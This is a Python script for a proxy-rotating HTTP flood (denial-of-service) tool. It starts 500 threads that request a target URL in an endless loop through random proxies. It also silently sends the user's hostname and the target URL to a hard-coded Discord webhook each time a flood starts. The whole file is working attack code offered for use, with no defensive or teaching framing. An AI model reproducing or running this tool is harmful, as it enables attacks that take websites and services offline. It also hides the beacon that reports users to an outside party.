try:
    import urllib.request, os, threading, time, random, sys
    from discord_webhook import DiscordWebhook
    import socket
except ImportError:
    if sys.platform.startswith("linux"):
        os.system("pip3 install discord_webhook")
    else:
        os.system("pip install discord_webhook")

usl = "https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm"
useragents = [
    # ... (your user agents list)
]

class Fucker(threading.Thread):
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = {'User-Agent': random.choice(useragents)}
        self.lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener)
        req = urllib.request.Request(self.url, data, self.headers)
        response = urllib.request.urlopen(req)
        # Handle the response if needed
        print("[packet sending]\r", end="")

    def run(self):
        while True:
            try:
                self.request()
            except Exception as e:
                sys.stdout.write(f"packet sending [{self.url}] - {e}\r")
                sys.exit(0)

class MainLoop():
    def home(self):
        banner_text = """
         _  __    _      _     _           
        | |/ /___| |_ __| | __| | ___  ___ 
        | ' // __| __/ _` |/ _` |/ _ \/ __|
        | . \ (__| || (_| | (_| | (_) \__ \\
        |_|\_\___|\__\__,_|\__,_|\___/|___/
        """
        print(banner_text)

        try:
            url = sys.argv[1]
            hst = socket.gethostname()
            webhook = DiscordWebhook(
                urls=usl, content=f'{hst} Has Started Flood To {url}'
            )
            response = webhook.execute()
        except Exception as e:
            print(f"Error: {e}")

        try:
            file_proxy = "proxylist.txt"
            with open(file_proxy, "r") as in_file:
                proxy_lines = in_file.readlines()
        except Exception as e:
            print(f"Error: {e}")

        num_threads = 500
        try:
            for i in range(num_threads):
                in_line = random.choice(proxy_lines).strip()
                Fucker(url, i + 1, in_line).start()
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    if sys.platform.startswith("linux"):
        os.system("clear")
    else:
        os.system("cls")
    MainLoop().home()
